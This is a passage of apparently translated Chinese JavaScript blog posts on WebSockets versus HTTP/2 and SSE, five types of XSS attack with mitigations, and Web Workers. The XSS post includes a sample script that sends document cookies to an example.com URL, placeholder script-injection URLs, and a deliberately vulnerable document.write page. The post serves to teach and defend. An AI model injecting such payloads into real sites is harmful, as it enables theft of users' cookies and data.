“Comet“ 技术。 长轮询是服务端主动向客户端发送数据的最常见的 hacks 之一。通过长轮询，客户端打开了一个到服务端的 HTTP 连接直到返回响应数据。当服务端有新数据需要发送时，它会把新数据作为响应发送给客户端。 让我们看一下简单的长轮询代码片段： 123456789101112131415(function poll(){ setTimeout(function(){ $.ajax({ url: 'https://api.example.com/endpoint', success: function(data) { // 处理 `data` // ... //递归调用下一个轮询 poll(); }, dataType: 'json' }); }, 10000);})(); 这是一个自执行函数，第一次会自动运行。它每 10 秒钟异步请求服务器并且当每次发起对服务器的异步请求之后，会在回调函数里面再次调用 ajax 函数。 其它技术涉及 Flash 和 XHR 多方请求以及所谓的 htmlfiles。 所有这些方案都有一个共同的问题：都带有 HTTP 开销，这样就会使得它们无法满足要求低延迟的程序。想象一下浏览器中的第一人称射击游戏或者其它要求实时组件功能的在线游戏。 WebSockets 的出现WebSocket 规范定义了一个 API 用于在浏览器和服务器建立一个 “socket” 连接。通俗地讲：在客户端和服务器保有一个持久的连接，两边可以在任意时间开始发送数据。 客户端通过 WebSocket 握手的过程来创建 WebSocket 连接。在这过程中，首先客户端向服务器发起一个常规 HTTP 请求。请求中会包含一个 Upgrade 的请求头，通知服务器客户端想要建立一个 WebSocket 连接。 让我们看下如何在客户端创建 WebSocket 连接： 12// 创建新的加密 WebSocket 连接URvar socket = new WebSocket('ws://websocket.example.com'); WebSocket 网址使用了 ws 方案。wss 是一个等同于 HTTPS 的安全的 WebSocket 连接。 该协议启动了 websocket.example.com 的 WebSocket 连接。 下面是初始化请求头的简化例子。 12345GET ws://websocket.example.com/ HTTP/1.1Origin: http://example.comConnection: UpgradeHost: websocket.example.comUpgrade: websocket 如果服务器支持 WebSocket 协议，它将同意升级请求，然后通过在响应里面返回 Upgrade 头来进行通信。 让我们看下在 Node.js 的实现： 123456789101112131415161718192021222324252627// 我们将会使用 https://github.com/theturtle32/WebSocket-Node 来实现 WebSocketvar WebSocketServer = require('websocket').server;var http = require('http');var server = http.createServer(function(request, response) { // 处理 HTTP 请求});server.listen(1337, function() { });// 创建服务器wsServer = new WebSocketServer({ httpServer: server});// WebSocket 服务器wsServer.on('request', function(request) { var connection = request.accept(null, request.origin); // 这是最重要的回调，在这里处理所有用户返回的信息 connection.on('message', function(message) { // 处理 WebSocket 信息 }); connection.on('close', function(connection) { // 关闭连接 });}); 连接建立之后，服务器使用升级来回复： 1234HTTP/1.1 101 Switching ProtocolsDate: Wed, 25 Oct 2017 10:07:34 GMTConnection: UpgradeUpgrade: WebSocket 一旦连接成功建立，会触发客户端 WebSocket 实例的 open 事件。 123456var socket = new WebSocket('ws://websocket.example.com');// WebSocket 连接打开的时候，打印出 WebSocket 已连接的信息socket.onopen = function(event) { console.log('WebSocket is connected.');}; 握手完成后，最初的 HTTP 连接会被替换成 WebSocket 连接，该连接底层使用同样的 TCP/IP 连接。现在两边都可以开始发送数据。 通过 WebSocket，你可以随意多发送数据而不用担心传统 HTTP 请求所带来的相关开销。数据是以消息(messages)的形式通过 WebSocket 进行传输的，每条信息是由包含你所传输的数据(有效载荷)的一个或多个帧所组成的。为了保证当消息到达客户端的时候被正确地重新组装出来，每一帧都会前置关于有效载荷的 4-12 字节数据。使用这种基于帧的信息系统可以帮助减少非有效载荷数据的传输，从而显著地减少信息延迟。 注意：只有当所有的消息帧都被接收到而且原始的信息有效载荷被重新组装的时候，客户端才会接收到新消息的通知。 WebSocket 地址前面我们简要地谈到 WebSockets 引进了一个新的地址协议。实际上，WebSocket 引进了两种新协议：ws:// 和 wss://。 URL 地址含有指定方案的语法。WebSocket 地址特别之处在于，它不支持锚点(#sample_anchor)。 WebSocket 和 HTTP 风格的地址使用相同的规则。ws 是未加密且默认是 80 端口，而 wss 要求 TSL 加密且默认 443 端口。 帧协议让我们深入了解下帧协议。这是 RFC 提供的： 1234567891011121314151617180 1 2 3 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 +-+-+-+-+-------+-+-------------+-------------------------------+ |F|R|R|R| opcode|M| Payload len | Extended payload length | |I|S|S|S| (4) |A| (7) | (16/64) | |N|V|V|V| |S| | (if payload len==126/127) | | |1|2|3| |K| | | +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - + | Extended payload length continued, if payload len == 127 | + - - - - - - - - - - - - - - - +-------------------------------+ | |Masking-key, if MASK set to 1 | +-------------------------------+-------------------------------+ | Masking-key (continued) | Payload Data | +-------------------------------- - - - - - - - - - - - - - - - + : Payload Data continued ... : + - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - + | Payload Data continued ... | +---------------------------------------------------------------+ 由于 WebSocket 版本是由 RFC 所规定的，所以每个数据包前面只有一个头部信息。然而，这个头部信息相当的复杂。这是其组成模块的说明： fin(1 位)：指示是否是组成信息的最后一帧。大多数时候，信息只有一帧所以该位通常有值。测试表明火狐的第二帧数据在 32K 之后。 rsv1，rsv2，rsv3(每个一位)：必须是 0 除非使用协商扩展来定义非 0 值的含义。如果收到一个非 0 值且没有协商扩展来定义非零值的含义，接收端会中断连接。 opcode(4 位)：表示第几帧。目前可用的值： 0x00：该帧接续前面一帧的有效载荷。 0x01：该帧包含文本数据。 0x02：该帧包含二进制数据。 0x08：该帧中断连接。 0x09：该帧是一个 ping。 0x0a：该帧是一个 pong。 (正如你所见，有相当一部分值未被使用；它们是保留以供未来使用)。 mask(1 位)：指示该连接是否被遮罩。正其所表示的意义，每一条从客户端发往服务器的信息都必须被遮罩，然后如果信息未遮罩，根据规范会中断该连接。 payload_len(7 位)：有效载荷的长度。WebSocket 帧有以下几类长度： 0-125 表示有效载荷的长度。126 意味着接下来两个字节表示有效载荷长度，127 意味着接下来 8 个字节表示有效载荷长度。所以有效载荷的长度大概有 7 位，16 位和 64 位这三类。 masking-key (32 位)：所有从客户端发往服务器的帧都由帧内的一个 32 位值所遮罩。 payload：一般情况下是被遮罩的实际数据。其长度取决于 payload_len。 为什么 WebSocket 是基于帧而不是基于流呢？我知道的也不多，如果你有任何想法，欢迎在下面的评论区添加评论和资源。另外，HackerNews 上面有关于这方面的讨论。 帧数据正如上面提到的，数据可以被拆分为多个帧。第一帧所传输的数据里面含有一个操作码表示数据的传输顺序。这是必须的，因为当规范刚完成时，JavaScript 并不能很好地支持二进制数据传输。0x01 表示 utf-8 编码的文本数据，0x02 表示二进制数据。大多数人在传输 JSON 数据的时候都会选择文本操作码。当你传输二进制数据的时候，它会以浏览器指定的 Blob 来表示。 通过 WebSocket 来传输数据的 API 是非常简单的： 1234var socket = new WebSocket('ws://websocket.example.com');socket.onopen = function(event) { socket.send('Some message'); // 向服务器发送数据}; 当 WebSocket 正在接收数据的时候（客户端），会触发 message 事件。该事件会带有一个 data 属性，里面包含了消息的内容。 12345// 处理服务器返回的消息socket.onmessage = function(event) { var message = event.data; console.log(message);}; 你可以使用用 Chrome 开发者工具的网络选项卡来轻易检查 WebSocket 连接中的每一的数据。 数据切片有效载荷数据可以被分成多个独立的帧。接收端会缓冲这些帧直到 fin 位有值。所以你可以把字符串『Hello World』拆分为 11 个包，每个包由 6(头长度) + 1 字节组成。数据分片不能用来控制包。然而，规范提供了去处理交错控制帧的能力。这是为了解决 TCP 包无序到达客户端的问题。 连接帧的逻辑大概如下： 接收第一帧 记住操作码 连接帧有效载荷直到 fin 位有值 断言每个包的操作码都为 0 数据分片的主要目的在于允许开始时传输不明大小的信息。通过数据分片，服务器可能需要设置一个合理的缓冲区大小，然后当缓冲区满，返回一个数据分片。数据分片的第二个用途即多路复用，逻辑通道上的大量数据占据整个输出通道是不合理的，所以利用多路复用技术把信息拆分成更小的数据分片以更好地共享输出通道。 心跳检测握手之后的任意时刻，客户端和服务器可以随意地 ping 对方。当接收到 ping 的时候，接收方必须尽快回复一个 pong。称之为一个心跳。你可以用它来确保客户端是否保持连接。 一个ping 或者 pong 虽然只是一个普通帧，但却是一个控制帧。Ping 包含 0x9 操作码，而 Pong 包含 0xA 操作码。当你接收到 ping 的时候，返回一个和 ping 携带同样有效载荷数据的 pong(ping 和 pong 最大有效载荷长度都为 125)。你可能接收到一个 pong 而不用发送一个 ping。这样的情况发生时可以忽略它。 心跳非常有用。利用服务（比如负载均衡器）来中断空闲的连接。此外接收端不可能知道远端是否已经中断连接。只有在发送下一帧时才能意识到发生了错误。 错误处理你可以像这样监听 error 事件来处理错误。 123456var socket = new WebSocket('ws://websocket.example.com');// 处理错误socket.onerror = function(error) { console.log('WebSocket Error: ' + error);}; 关闭连接客户端或服务器可以发送一个包含 0x8 操作码数据的控制帧来关闭连接。当接收到控制帧时，另一端会返回一个关闭帧。前者接收到后会关闭连接, 之后接收的任何数据都会被遗弃。 这是初始化关闭客户端的 WebSocket 连接的代码： 1234// 如果连接打开着则关闭if (socket.readyState === WebSocket.OPEN) { socket.close();} 同样为了在完成关闭连接后进行任意处理工作，你可以为 close 事件添加事件监听函数： 1234// 运行必要的清理工作socket.onclose = function(event) { console.log('Disconnected from WebSocket.');}; 服务器需要监听 close 事件以便在需要的时候处理： 123connection.on('close', function(reasonCode, description) { // 关闭连接}); WebSockets 和 HTTP/2 对比虽然 HTTP/2 提供了很多的功能，但是它并不能完全取代当前的 push/streaming 技术。 关于 HTTP/2 需要注意的最重要的事即它并不能完全取代 HTTP。关键词词，状态码以及大部分的头信息都会保持和现在一样。HTTP/2 只是提升了线路上的数据传输效率。 我们对比 WebSocket 和 HTTP/2，会发现一些共同之处： 正如上图所示，HTTP/2 引进了 Server Push 技术用来让服务器主动向客户端缓存发送数据。然而，它并不允许直接向客户端程序本身发送数据。服务端推送只能由浏览器处理而不能够在程序代码中进行处理，意即程序没有 API 可以用来获取这些事件的通知。 这时候服务端推送事件（SSE）就派上用场了。SSE 是这样的机制一旦客户端－服务器连接建立，它允许服务器异步推送数据给客户端。之后，每当服务器产生新数据的时候，就推送数据给客户端。这可以看成是单向的发布－订阅模型。它也提供了一个被称为 EventSource 的 标准 JavaScript 客户端 API，该 API 作为 W3C 组织发布的 HTML5 标准的一部分已经在大多数的现代浏览器中实现。请注意不支持原生 EventSource API 的浏览器可以通过Polyfill实现。 由于 SSE 是基于 HTTP 的，所以它自然兼容于 HTTP/2 并且可以混用以利用各自的优势： HTTP/2 处理一个基于多路复用流的高效传输层而 SSE 为程序提供了 API 用来支持服务端推送。 为了完全理解流和多路复用技术，先让我们来了解一下 IETF 的定义：『流』即是在一个 HTTP/2 连接中，在客户端和服务端间进行交换传输的一个独立双向帧序列。它的主要特点之一即单个的 HTTP/2 连接可以包含多个并发打开的流，其中任意一端点交错传输来自多个流的帧。 必须记住的是 SSE 是基于 HTTP 的。这意味着通过 HTTP/2，不仅仅可以把多个 SSE 流交叉合并成单一的 TCP 连接，还可以把多个 SSE 流（服务端向客户端推送）和多个客户端请求（客户端到服务端）合并成单一的 TCP 连接。多亏了 HTTP/2 和 SSE，现在我们有了一个纯粹的 HTTP 双向连接，该连接带有一个简单的 API 允许程序代码注册监听服务端的数据推送。缺乏双向通信能力一直被认为是 SSE 对比 WebSocket 的主要缺点。多亏了 HTTP/2，这不再是缺点。这就让你有机会坚持使用基于 HTTP 的通信系统而非 WebSockets。 WebSocket 和 HTTP/2 的使用场景WebSockets 依然可以在 HTTP/2 + SSE 的统治下存在，主要因为它是广泛采用技术，在特殊情况下，和 HTTP/2 比较它有一个优点即它天生拥有更少的开销（比如，头部信息）的双向通信能力。 假设想要构建一个大型的多人在线游戏，在各个连接终端会产生大量的信息。在这样的情况下，WebSockets 表现更佳。 总的来说，当你需要在客户端和服务端建立一个真正的低延迟的，接近实时连接的时候使用 WebSockets。记住这可能要求你重新考虑如何构建服务器端程序，同时也需要你关注诸如事件队列的技术。 如果你的使用场景要求显示实时市场新闻，市场数据，聊天程序等等，HTTP/2 + SSE 将会为你提供一个高效的双向通信通道且你可以得到 HTTP 的所有益处： 当考虑现有架构的兼容性的时候，WebSockets 经常会是一个痛点，因为升级 HTTP 连接到一个完全和 HTTP 不相关的协议。 可扩展性和安全：网络组件（防火墙，入侵检测，负载均衡器）的建立，维护和配置都是为 HTTP 所考虑的，大型／重要的程序会更喜欢具有弹性，安全和可伸缩性的环境。 同样地，你不得不考虑浏览器兼容性。 WebSocket 兼容性还不错： 发文的时候是17年, TTP/2 和 SSE的情况稍微差点但现在也还行。 SessionStack 是如何做选择的？SessionStack 同时使用 WebSockets 和 HTTP，这取决于使用场景。 一旦整合 SessionStack 进网页程序，它会开始记录 DOM 变化，用户交互，JavaScript 异常，堆栈追踪，失败的网络请求以及调试信息，允许你用视频回放网页程序中的问题及发生在用户身上的一切事情。全部都是实时发生的并且要求对网页程序不会产生任何的性能影响。 这意味着你可以实时加入到用户会话，而用户仍然在浏览器中。这样的情况下，我们会选择使用 HTTP，因为这并不需要双向通信（服务端把数据传输到浏览器端）。当前情况下，使用 WebSocket 就是过度使用，难以维护和扩展。 然而，整合进网页程序的 SessionStack 库应用了 WebSocket（优先使用，否则回滚到 HTTP）。它会打包并且向我们的服务器发送数据，这是单向通信。在这种情况下，之所以选择 WebSocket 是因为计划中的某些产品功能可能需要进行双向通信。","link":"/posts/c28fa542.html"},{"title":"5种跨站脚本攻击及防御措施","text":"How JavaScript works: 5 types of XSS attacks + tips on preventing them 原文请查阅这里，略有删减)。 概述跨站脚本（XSS）是浏览器端的代码注入攻击。当攻击者能够将恶意代码注入应用程序就会执行注入攻击。然后代码会在特定环境执行并执行恶意操作。 对于浏览器，攻击者向 Web 应用程序内部注入恶意脚本，随后被受害者使用。通常，XSS 攻击基于受害者对他们使用的 Web 应用程序的信任。 JavaScript 在受限的环境下运行，该环境对用户的操作系统的访问权限有限。这意味着 XSS 攻击无意破坏受害者的计算机，其主要目标是窃取个人信息。 根据攻击者的目标，可以采用不同的方式来实现 XSS。 XSS 攻击有五种主要类型。 持久型跨站脚本 Persistent (Stored) XSS当 Web 应用程序接受用户输入并将其存储到服务器时，可能会存在持久型 XSS。应用程序在存储数据前未执行正确的前端/后端验证，因此存在严重漏洞。随后应用加载存储的数据并将其嵌入到 HTML 响应页面中时，便是代码注入的时机。 持久型 XSS 的攻击频率较低，因为使它们成为可能的漏洞较不常见且很难发现。 另一方面，它们破坏力很强。因为一旦恶意数据被存储在 Web 应用程序的服务器上，就有可能提供给许多用户。其他用户无需点击恶意链接或类似的东西-恶意代码已经嵌入到程序本身。 持久型 XSS攻击是 2 型 XSS 攻击，因为该攻击的实施需要通过两个请求执行的： 注入恶意代码并将其存储至 Web 服务器； 加载存储的代码并将其嵌入到包含有效负载的HTML页面中； 某些特定类型的网站和 Web 应用更容易遭受持久型 XSS攻击，因为它们允许用户共享内容。常见的例子是社交网络和论坛。 例子假设攻击者在社交网络中的帖子下找到了评论功能的漏洞 - 社交网络应用直接在 html 页面的评论里渲染原始输入。 这允许攻击者在其评论中添加自定义脚本。 1&lt;script&gt; window.location = 'https://example.com/?user_data=' + document.cookies; &lt;/script&gt; 当社交网络应用加载此评论时，它将在其 HTML 中包含了 script标签。自动将当前用户重定向到恶意网站的 URL，并以所有 cookie 为参数发送。随后，恶意网站可以存储 cookie 并窃取敏感数据。 由于许多人可以访问到特定帖子的评论，因此所有访问者都可能成为受害者。 这个例子其实比较浅显，实际上也没有那么多如此容易就能找到严重漏洞的社交网络平台，但这个例子说明了持久型 XSS 的潜在规模。 预防措施防止持久型 XSS 攻击的最有效方法是，默认确保对所有用户输入存储到服务器上之前进行适当的校验清理。 静态内容过滤也是一种不错的做法毕竟恶意脚本可以通过各种方式注入。 仅在客户端上几乎没有可靠的方法可以完全进行以防止持久型 XSS 攻击。 反射型 XSS（Reflected XSS）反射型 XSS 攻击发生在从浏览器发送到服务器的数据包含在服务器的响应中时。 之所以称为“反射型”是因为恶意脚本会从网络应用程序反射到受害者的浏览器。 攻击者诱导用户访问一个带有恶意代码的链接后激活，链接将具有漏洞的请求发送到 Web 应用程序，该漏洞使恶意脚本得以执行。 与在 Web 应用程序服务器上存储恶意脚本的持久型 XSS 攻击不同，反射型 XSS 攻击仅要求将恶意脚本嵌入 URL中。 另一点不同之处是持久型 XSS 攻击会自动对访问页面的任何用户执行恶意脚本，而反射式 XSS 攻击则要求最终用户点击恶意链接。 例子假设有一个应用程序具有搜索功能。其工作方式如下： 用户在输入框中输入搜索词。 Web 应用程序将用户重定向到结果页，页面链接上将搜索词作为查询参数。 搜索词取自查询参数，并被发送到服务器进行处理。 处理完成后，页面上会渲染响应数据。响应中既包含用户的搜索词，也包含来自服务器的匹配结果。 如果用户在输入框中输入javascript，则将重定向到以下页面： https://example.com/search/?term=javascript 程序获取javascript一词，并发送到服务器。处理完成后，页面将渲染响应： 12&lt;div&gt; You searched for: javascript &lt;/div&gt;&lt;div&gt; Results: &lt;/div&gt; 如果应用未对搜索词进行任何处理或验证，则攻击者可以通过以下输入将恶意代码嵌入搜索词中： 1&lt;script&gt;/*Malicious code*/&lt;/script&gt; 生成的 URL 如下： https://example.com/search/?term=&lt;script&gt;/*+Malicious+code+*/&lt;/script&gt; 页面则会渲染： 12&lt;div&gt; You searched for: &lt;script&gt;/*Malicious code*/&lt;/script&gt; &lt;/div&gt;&lt;div&gt; Results: &lt;/div&gt; 如果将此 URL 分享给其他用户，攻击者提供的脚本将会在他们的浏览器中执行。 攻击者可以通过多种方式将恶意链接传播给受害者。包括将链接放置在攻击者控制的网站和其他内容生成型的网站（论坛，社交网络等），或通过电子邮件发送链接等。 攻击可能针对特定用户，也可能是对任何用户的无差别攻击。 措施与持久型 XSS 攻击不同，用户可以保持警惕，从而避免反射 XSS 攻击。具体来说，就是不点击可疑链接。 与持久型 XSS 一样，必须对所有用户输入进行清理。 自我型跨站脚本攻击 Self-XSS自我型 XSS 与反射型 XSS 非常相似。不同之处在于无法通过特制URL 触发攻击。自我型 XSS 只能由受害者本人在自己的浏览器中触发。 听起来这种 XSS 攻击并不危险，这远非事实。自我型 XSS 攻击是通过社交工程成功进行的。在信息安全的大背景下，社会工程学是在心理上操纵他人执行可能对自身产生负面影响的行动。 例子自我 XSS 攻击的一种常见方式是使受害者将一些恶意代码粘贴到其浏览器的控制台中。这样攻击者可以访问到 cookie，DOM 等所有当前可用信息。 措施只有用户保持警惕心才能阻止此类攻击。网络应用的开发人员无法在浏览器的控制台中侦测或封锁恶意代码的执行。 一些流行的网络应用和网站会浏览器控制台中放置警告消息，以防止用户在此执行任何代码。 某些浏览器方会采取一些措施，通过实施安全措施来警告用户有关自我 XSS 攻击信息的方式来减少此类攻击发生的几率。 基于 DOM 的跨站脚本攻击 DOM-based XSS基于 DOM 的 XSS 攻击常发生于程序当动态更改的 DOM 并在运行时由 Web应用程序本身注入恶意代码时。 基于 DOM 的 XSS 的触发需要网络应用的 JavaScript 代码需从攻击者可以控来源（例如浏览器标签页中的URL）处获取输入。 例子让我们看以下页面： 12345678910111213&lt;html&gt; &lt;head&gt; &lt;title&gt; Dashboard &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; let startPosition = document.URL.indexOf(\"role=\") + 5; let userRole = document.URL.substring(startPosition,document.URL.length); document.write(userRole); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 页面的脚本从“角色”查询参数中获取值，并将其插入到 DOM 中。攻击者可以将查询参数的值设为一段恶意代码，该代码将注入到 DOM 中： https://example.com/?role=&lt;script&gt;/*Malicious+code*/&lt;/script&gt; 即便 Web 应用程序的代码容易受到这种攻击，在这特殊情况下，由于 URL 是请求的一部分，所以服务器可以检测到。若服务器内置了对应的安全机制，基于 DOM 的 XSS 攻击完全可以避免。 另一种避免将有效载荷发送到服务器的技术是使用 URL片段。 这是 URL 中位于＃号之后的部分。 URL 片段不会由浏览器发送到服务器。 先前的URL可以修改为： https://example.com/#role=&lt;script&gt;/*Malicious+code*/&lt;/script&gt; 这样，恶意脚本将不会被发送至服务器，当然也就不会被检测到。 措施所有依赖用户输入的 DOM 操作和重定向都应进行检测。这一步骤应该在客户端进行，因为无法在服务器上防止基于 DOM 的XSS。 某些情况下用户的警惕性也可能起作用。在类似示例的情况下，用户必须点击 URL 或需要输入一些数据，因此在输入恶意代码时应谨慎。 Blind XSS盲 XSS 攻击是一种持久型 XSS 攻击。它们以相同的方式执行。 不同之处在于，恶意代码是在应用程序的另一部分或在完全不同的应用程序中渲染及执行。在这两种情况下，攻击者都无法访问到执行恶意代码的页面。 例子Blind XSS 攻击的一个示例是，攻击者将恶意代码注入 Web 应用程序的客户反馈页面中。当程序管理员打开反馈信息中心时，恶意代码将被执行。 脚本甚至可以在其他应用中使用，例如管理用户反馈的内部工具。恶意代码可以由服务器保存，并且只有在管理员访问易受攻击的仪表板页面很长一段时间后才执行。有效负载执行可能花费数小时，数天甚至数周。 补充: 翻到结尾发现文章结构有点问题。既然 Blind XSS 属于持久型 xss 攻击就不应该名约 5 种类型。 Blind XSS 攻击的另一个示例是利用日志解决方案，如异常处理程序。攻击者可以使用日志管理的 API 来记录恶意代码而不是错误。 在异常处理解决方案的面板中显示已记录的错误，渲染并执行恶意代码。 措施由于此类攻击属于持久型 XSS 攻击的子集，因此预防措施也是一样的。 参考资源 https://sucuri.net/guides/what-is-cross-site-scripting/ https://www.acunetix.com/blog/articles/persistent-xss/ https://medium.com/iocscan/persistent-cross-site-scripting-p-xss-557c70377554 https://portswigger.net/web-security/cross-site-scripting/reflected https://www.acunetix.com/websitesecurity/detecting-blind-xss-vulnerabilities/","link":"/posts/6eb073a6.html"},{"title":"Web Workers及5个使用场景","text":"How JavaScript works: The building blocks of Web Workers + 5 cases when you should use them 原文请查阅这里，略有删减。 第七章我们将探索 Web Workers：首先有个概述比较不同类型的 workers，和如何组合运用他们的构建模块来进行开发以及不同场景下各自的优缺点。最后，我们将会介绍 5 个 Web Workder 的使用场景。 在第一章你应该已经清楚 JavaScript 是单线程的事实。然而，JavaScript 也允许开发者编写异步代码。 异步编程的局限性前面我们了解到异步编程及其使用时机。 异步编程通过调度部分代码使之在事件循环中延迟执行，这样允许程序界面优先渲染，从而使程序运行更流畅。 AJAX 请求是一个很好的异步编程的使用场景。因为请求可能会花大量时间，所以异步执行它们然后在客户端等待数据返回的同时，运行其它代码。 1234567// 假设使用 jQueryjQuery.ajax({ url: 'https://api.example.com/endpoint', success: function(response) { // 当数据返回时候的代码 }}); 然而，这里会产生一个问题－ 请求是由浏览器网页 API 进行处理的，可以异步执行其它代码吗？比如，假设成功回调的代码属于 CPU 密集型的： 1var result = performCPUIntensiveCalculation(); 如果 performCPUIntensiveCalculation 不是一个 HTTP 请求而是一段会阻塞界面渲染的代码（比如大数量的 for 循环），这样就没办法释放事件循环和浏览器UI－浏览器会失去响应。 这意味着，异步函数只解决了小一部分 JavaScript 的单线程限制。 某些情况下，你可以通过使用 setTimeout 来很好地解决由于长时间计算所造成的 UI 阻塞。比如，通过把一个复杂的计算批量拆分为若干个setTimeout 调用 ，把它们放在事件循环的不同位置执行，然后这样就可以使得 UI 有时间进行渲染及响应。 让我们看一个计算数值数组的平均值的简单函数。 123456789101112131415function average(numbers) { var len = numbers.length, sum = 0, i; if (len === 0) { return 0; } for (i = 0; i &lt; len; i++) { sum += numbers[i]; } return sum / len;} 可以把以上代码重写为模拟异步： 1234567891011121314151617181920212223function averageAsync(numbers, callback) { var len = numbers.length, sum = 0; if (len === 0) { return 0; } function calculateSumAsync(i) { if (i &lt; len) { // 在事件循环中调用下一个函数 setTimeout(function() { sum += numbers[i]; calculateSumAsync(i + 1); }, 0); } else { // 到达数组末尾，调用回调 callback(sum / len); } } calculateSumAsync(0);} 这利用 setTimeout 函数在事件循环中循序添加每一次计算。在每一次计算之间有足够时间来进行其它的计算和释放浏览器。 Web Workers 概览HTML5 带来了很多开箱即用的好功能，包括： SSE（之前文章中提到过并且和 WebSockets 进行了比较） Geolocation Application cache Local Storage Drag and Drop Web Workers Web Workers 是浏览器内置的线程，可用来执行 JavaScript 代码而不会阻塞事件循环。 整个 JavaScript 是基于单线程环境的而 Web Workers 可以突破这方面的限制（部分）。 Web Workers 允许开发者把长时间运行和密集计算型的任务放在后台执行而不会阻塞 UI，这会使得应用程序运行得更加流畅。另外，这样就不用再使用 setTimeout 的 Hack 来防止阻塞事件循环了。 这里有一个展示使用和未使用 Web Workers 来进行数组排序的区别的示例。 Web Workers 允许你做诸如运行处理 CPU 计算密集型任务的耗时脚本而不会阻塞 UI 的事情。事实上，所有这些操作都是并行执行的。Web Workers 是真正的多线程。 你或许会有疑问－『难道 JavaScript 不是单线程的吗？』。 当你意识到 JavaScript 是一门没有定义线程模型的语言时，你会感觉非常惊讶。Web Workers 并不是 JavaScript 的一部分，它是可以通过 JavaScript 进行操作的浏览器功能之一。以前，大多数的浏览器是单线程的（当然，现在已经变了），而且大多数的 JavaScript 功能是在浏览器端实现完成的。Node.js 没有实现 Web Workers －它有 『cluster』和 『child_process』的概念，这两者和 Web Workers 有些许差异。 Workers 类型值得注意的是，规范中有三种类型的 Web Workers： Dedicated Workers Shared Workers Service workers Dedicated WorkersDedicated Web Workers 是由主进程实例化并且只能与之进行通信 Shared WorkersShared workers 可以被运行在同源的所有进程访问（不同的浏览的选项卡，内联框架及其它shared workers）。 Service WorkersService Worker 是一个由事件驱动的 worker，它由源和路径组成。它可以控制它关联的网页，解释且修改导航，资源的请求，以及一种非常细粒度的方式来缓存资源以让你非常灵活地控制程序在某些情况下的行为（比如网络不可用）。 三种 web workers 支持情况 本篇文章，我们将专注 Dedicated Workers 并以 『Web Workers』或者 『Workers』来称呼它。 Web Workers 工作原理Web Workers 是以加载 .js 文件的方式实现的，这些文件会在页面中通过 HTTP 请求异步加载。这些请求会被 Web Worker API 完全隐藏。 Workers 使用类线程的消息传输－获取模式。它们非常适合于为用户提供最新的 UI ，高性能及流畅的体验。 Web Workers 运行于浏览器的一个隔离线程之中。因此，他们所执行的代码必须被包含在一个单独的文件之中。切记。 让我们看如何创建一个 worker 吧： 1var worker = new Worker('task.js'); 如果『task.js』文件存在且可访问，浏览器会生成一个线程来异步下载文件。当下载完成的时候，文件会立即执行然后 worker 开始运行。万一文件不存在，worker 会运行失败且没有任何提示。 为了启动创建的 worker，你需要调用 postMessage 方法： 1worker.postMessage(); Web Worker 通信为了在 Web Worker 和 创建它的页面间进行通信，你得使用 postMessage 方法或者一个广播信道。 postMessage 方法最新的浏览器支持方法的第一参数为一个 JSON 对象而旧的浏览器只支持字符串。 让我们来看一个例子，通过往 worker 的方法的第一个参数传入更为复杂的 JSON 对象来理解其创建者页面是如何与之进行来回通信的。传入字符串与之类似。 让我们看以下的 HTML 页面（或者更准确地说是 HTML 页面的一部分） 123456789101112&lt;button onclick=\"startComputation()\"&gt;Start computation&lt;/button&gt;&lt;script&gt; function startComputation() { worker.postMessage({'cmd': 'average', 'data': [1, 2, 3, 4]}); } var worker = new Worker('doWork.js'); worker.addEventListener('message', function(e) { console.log(e.data); }, false); &lt;/script&gt; worker 脚本如下： 1234567891011self.addEventListener('message', function(e) { var data = e.data; switch (data.cmd) { case 'average': var result = calculateAverage(data); // 某个数值数组中计算平均值的函数 self.postMessage(result); break; default: self.postMessage('Unknown command'); }}, false); 点击按钮时，会在主页面调用 postMessage 方法。 worker.postMessage 那行代码会把包含 cmd 和 data 属性及其各自属性值的 JSON 对象传入 worker。worker 通过定义监听 message 事件来处理传过来的消息。 当接收到消息的时候，worker 会执行实际的计算而不会阻塞事件循环。worker 会检查传进来的 e 事件，然后像一个标准的 JavaScript 函数那样运行。当运行结束，传回主页面计算结果。 在 worker 的上下文中，self 和 this 都指向 worker 的全局作用域。 有两种方法来中断 woker 的执行：主页面中调用 worker.terminate() 或者在 workder 内部调用 self.close() 广播信道Broadcast Channel 是更通用的通信接口。它允许我们向共享同一个源的所有上下文发送消息。同源下的所有的浏览器选项卡，内联框架或者 workers 都可以发送和接收消息： 1234567891011121314// 连接到一个广播信道var bc = new BroadcastChannel('test_channel');// 发送简单信息示例bc.postMessage('This is a test message.');// 一个在控制台打印消息的简单事件处理程序示例// logs the message to the consolebc.onmessage = function (e) { console.log(e.data); }// 关闭信道bc.close() 你可以通过广播信道的图例以更加深刻的理解它。 然而，广播信道浏览器兼容性不太好： 消息大小有两种向 Web Workers 发送消息的方法： 复制消息：消息被序列化，复制，然后发送出去，接着在接收端反序列化。页面和 worker 不共享一个相同的消息实例，所以在每次传递消息过程中最后的结果都是复制的。大多数浏览器是通过在任何一端自动进行 JSON 编码/解码消息值来实现这一功能。正如所预料的那样，这些对于数据的操作显著增加了消息传送的性能开销。消息越大，传送的时间越长。 消息传输：这意味着最初的消息发送者一发送即不再使用（）。数据传输非常的快。唯一的限制即只能传输 ArrayBuffer 数据对象。 Web Workers 的可用功能由于 Web Workers 的多线程特性，它只能使用一部分 JavaScript 功能。以下是可使用的功能列表： navigator 对象 location 对象（只读） XMLHttpRequest setTimeout()/clearTimeout() 和 setInterval()/clearInterval() Application Cache 使用 importScripts 来引用外部脚本 创建其它 web workers Web Worker 的局限性令人沮丧的是，Web Workers 不能够访问一些非常关键的 JavaScript 功能： DOM（非线程安全的） window 对象 document 对象 parent 对象 这意味着 Web Worker 不能够操作 DOM（因此不能更新 UI）。有时候，这会让人很蛋疼，不过一旦你学会合理地使 Web Workers，你就会把它当成单独的『计算机器』来使用而用其它页面代码来操作 UI。Workers 将会为你完成繁重的计算任务然后一旦任务完成，会把结果传到页面中并对界面进行必要的更新。 错误处理和任何 JavaScript 代码一样，你会想要处理 Web Workers 中的任何错误。当在 worker 执行过程中有错误发生的时候，会触发 ErrorEvent 事件。这个接口包含三个有用的属性来指出错误的地方： filename－引起错误的 worker 脚本文件名 lineno－引起错误的代码行数 message－错误描述 示例： 123456789function onError(e) { console.log('Line: ' + e.lineno); console.log('In: ' + e.filename); console.log('Message: ' 